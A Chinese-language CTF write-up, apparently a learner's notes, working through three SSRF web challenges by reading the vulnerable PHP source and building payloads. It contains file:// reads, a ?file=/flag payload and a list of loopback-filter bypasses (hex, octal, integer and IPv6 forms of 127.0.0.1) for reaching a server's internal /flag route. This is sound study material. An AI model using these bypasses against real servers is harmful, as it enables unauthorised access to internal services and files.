# FZNCTF—Web

### 1、[NISACTF 2022]easyssrf

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779436118153-d1453f95-efd7-49b5-bfcc-d34c5a439037.png)

在输入框先试试file://etc/flag

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779436215037-c39c5b17-f3b9-4432-baf5-99b02825a230.png)

提示存在文件/fl4g，再去用file协议访问

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779436249811-2ff7e969-168c-42a7-a5bb-3ada71d8b8ac.png)

发现有两个文件

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779436531477-7b6e3d95-26b6-4551-ac89-991b7962dc3e.png)

直接在URL中拼接这个文件的路径访问
    
    
    highlight_file(__FILE__);   // 显示当前文件自身源码（便于调试或展示）
    error_reporting(0);          // 关闭所有错误报告，避免泄露路径等信息
    
    $file = $_GET["file"];       // 获取用户输入的 file 参数
    
    if (stristr($file, "file")){ // 不区分大小写检查参数中是否包含子串 "file"
        die("你败了.");          // 如果包含，直接结束并输出提示
    }
    
    // flag in /flag
    echo file_get_contents($file); // 否则，读取并输出 $file 所指向的文件内容

得到如下代码 具体功能在注释中写出

所以会显示file 由此的到payload ?file=/flag

### 2、[HNCTF 2022 WEEK2]ez_ssrf

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779439211665-63591e5b-bb42-4a38-9689-a207e0c9ebbf.png)

根据题目提示访问index.php得到如下代码
    
    
    <?php
    
    highlight_file(__FILE__);
    error_reporting(0);
    
    $data=base64_decode($_GET['data']);
    $host=$_GET['host'];
    $port=$_GET['port'];
    
    $fp=fsockopen($host,intval($port),$error,$errstr,30);
    if(!$fp) {
        die();
    }
    else {
        fwrite($fp,$data);
        while(!feof($data))
        {
            echo fgets($fp,128);
        }
        fclose($fp);
    }

尝试去分析这段代码
    
    
    $data=base64_decode($_GET['data']);  //
    $host=$_GET['host'];
    $port=$_GET['port'];

这是三个重要的变量 数据 主机地址和端口

### 3、[NSSRound#28 Team]ez_ssrf
    
    
    <?php
    highlight_file(__FILE__);
    
    //flag在/flag路由中
    
    if (isset($_GET['url'])) {
        $url = $_GET['url'];
    
        if (strpos($url, 'http://') !== 0) {
            echo json_encode(["error" => "Only http:// URLs are allowed"]);
            exit;
        }
    
        $host = parse_url($url, PHP_URL_HOST);
    
        $ip = gethostbyname($host);
    
        $forbidden_ips = ['127.0.0.1', '::1'];
        if (in_array($ip, $forbidden_ips)) {
            echo json_encode(["error" => "Access to localhost or 127.0.0.1 is forbidden"]);
            exit;
        }
    
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
        $response = curl_exec($ch);
    
        if (curl_errno($ch)) {
            echo json_encode(["error" => curl_error($ch)]);
        } else {
            echo $response;
        }
    
        curl_close($ch);
    } else {
        echo json_encode(["error" => "Please provide a 'url' parameter"]);
    }
    ?>
    {"error":"Please provide a 'url' parameter"}

尝试分析一下这个代码
    
    
       if (strpos($url, 'http://') !== 0) {
            echo json_encode(["error" => "Only http:// URLs are allowed"]);
            exit;
        }

这段应该是只接受http开头的url传入
    
    
    $host = parse_url($url, PHP_URL_HOST);
    $ip = gethostbyname($host);

这段没完全看懂 但应该就是host然后从host里提取ip 估计要用gopher构造数据包吧

我自己分析的错了，就是解析传进来的主机名并且获取IP而已
    
    
    $forbidden_ips = ['127.0.0.1', '::1'];
        if (in_array($ip, $forbidden_ips)) {
            echo json_encode(["error" => "Access to localhost or 127.0.0.1 is forbidden"]);
            exit;
        }

本地IP给禁了 IPV4 IPV6都不行 但是是为啥？
    
    
        $ch = curl_init();    //新建一个网络请求任务，$ch就代表这次请求操作
        curl_setopt($ch, CURLOPT_URL, $url);   //  创建网络请求，设置好目标URL
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  //回显用的代码
    
        $response = curl_exec($ch);    //执行curl请求

没完全懂 最后应该是执行 接收这个URL的响应包  
具体解释已写入注释中
    
    
        if (curl_errno($ch)) {
            echo json_encode(["error" => curl_error($ch)]);
        } else {
            echo $response;
        }
    
        curl_close($ch);
    } else {
        echo json_encode(["error" => "Please provide a 'url' parameter"]);
    }

这段应该是错误回显的内容

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779619403210-94e340b9-33f9-4bae-b462-ea6a6f3d399c.png?x-oss-process=image%2Fcrop%2Cx_0%2Cy_0%2Cw_911%2Ch_325)

可以看到刚好触发了最后一段的回显（Parameter n.参数）

所以构建的payload应该是 ?url=http://127.0.0.1/flag 但是localhost被过滤了所以要绕过
    
    
    http://0x7F.0.0.1	           //16进制
    http://0177.0.0.1	           //8进制
    http://2130706433	           //10进制整数格式
    http://0x7F000001	           //16进制整数格式
    http://127.1	               //省略模式
    http://127.127.127.127	     //用CIDR绕过localhost
    http://0	                   //特殊地址0
    http://0.0.0.0
    http://[::1]	               //ipv6回环地址

在上面的随便挑一个拼接/flag就可以了

⚠️个人的疑问：

为什么访问localhost/flag就能得到flag，文件难道在我的本地吗，不是应该访问服务器的/flag吗

🔍DeepSeek老师解答：

你的理解混淆了“本地”这个概念——这里的“本地”是指**服务器自己** ，而不是你访问题目的浏览器所在的那台电脑。

传入?url=http://127.0.0.1/flag后，服务器执行curl命令访问127.0.0.1，这时的127.0.0.1是服务器自己并不是我答题所使用的电脑本身。

而通过绕过代码的限制使得服务器自己访问自己，即是SSRF漏洞的所在。

⚠️DNS , HOST , IP , URL之间的联系

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779622775662-53f5de56-d96f-43a6-9994-d7baace1aaa7.png)
